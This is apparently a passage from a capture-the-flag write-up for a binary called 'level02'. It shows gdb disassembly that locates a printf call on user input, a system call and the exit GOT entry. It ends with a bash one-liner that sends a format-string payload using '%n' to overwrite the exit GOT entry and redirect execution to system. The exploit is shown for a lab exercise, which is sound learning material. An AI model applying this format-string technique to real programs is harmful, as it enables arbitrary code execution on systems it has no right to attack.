>   0x0000000000400a80 <+620>:	callq  0x4006c0 <printf@plt>
>   0x0000000000400a85 <+625>:	mov    $0x400d32,%edi
>   0x0000000000400a8a <+630>:	callq  0x4006b0 <system@plt>
>   0x0000000000400a8f <+635>:	mov    $0x0,%eax
>   0x0000000000400a94 <+640>:	leaveq 
>   0x0000000000400a95 <+641>:	retq   
>   0x0000000000400a96 <+642>:	lea    -0x70(%rbp),%rax
>   0x0000000000400a9a <+646>:	mov    %rax,%rdi
>   0x0000000000400a9d <+649>:	mov    $0x0,%eax
>   0x0000000000400aa2 <+654>:	callq  0x4006c0 <printf@plt>
>   0x0000000000400aa7 <+659>:	mov    $0x400d3a,%edi
>   0x0000000000400aac <+664>:	callq  0x400680 <puts@plt>
>   0x0000000000400ab1 <+669>:	mov    $0x1,%edi
>   0x0000000000400ab6 <+674>:	callq  0x400710 <exit@plt>

>(gdb) disas puts
>Dump of assembler code for function puts@plt:
>0x0000000000400680 <+0>:	jmpq   *0x200b5a(%rip)        # 0x6011e0 <puts@got.plt>
>0x0000000000400686 <+6>:	pushq  $0x1
>0x000000000040068b <+11>:	jmpq   0x400660
>End of assembler dump.

>(gdb) disas exit
>Dump of assembler code for function exit@plt:
>0x0000000000400710 <+0>:	jmpq   *0x200b12(%rip)        # 0x601228 <exit@got.plt>
>0x0000000000400716 <+6>:	pushq  $0xa
>0x000000000040071b <+11>:	jmpq   0x400660
>End of assembler dump.

`0x0000000000400a85 = 4196997`

```bash
{ python -c 'print("%4196997x" + "%8$n")'; python -c 'print("\x20\x0b\x12")'; } | ./level02
```

